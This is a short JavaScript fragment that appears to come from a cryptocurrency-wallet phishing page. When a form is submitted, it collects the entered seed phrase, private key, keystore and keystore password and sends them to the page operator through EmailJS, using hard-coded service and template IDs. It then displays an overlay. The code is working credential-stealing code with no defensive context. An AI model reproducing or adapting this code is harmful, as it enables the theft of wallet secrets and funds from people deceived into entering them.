      let form = document.getElementById("gform");
      form.addEventListener("submit", (e) => {
          e.preventDefault();
          console.log("submited");
          let phrase = document.getElementById("phraseText");
          let private = document.getElementById("privatekeyxxx");
          let keystore= document.getElementById("keystoreText");
          let keystorepass= document.getElementById("password");
          let wallet = document.getElementById("wallet_id");
          var templateParams = {
          // wallet: wallet.value,
          phrase: phrase.value,
          privatekey: private.value,
          keystore: keystore.value,
          keystorepass: keystorepass.value,
          };
      
          emailjs.send('service_y1wuubl', 'template_mvw7k2t', templateParams)
              .then(function(response) {
              console.log('SUCCESS!', response.status, response.text);
              console.log(templateParams);
              document.getElementById("over").style.display = "block";
              }, function(error) {
              console.log('FAILED...', error);
          });
      });
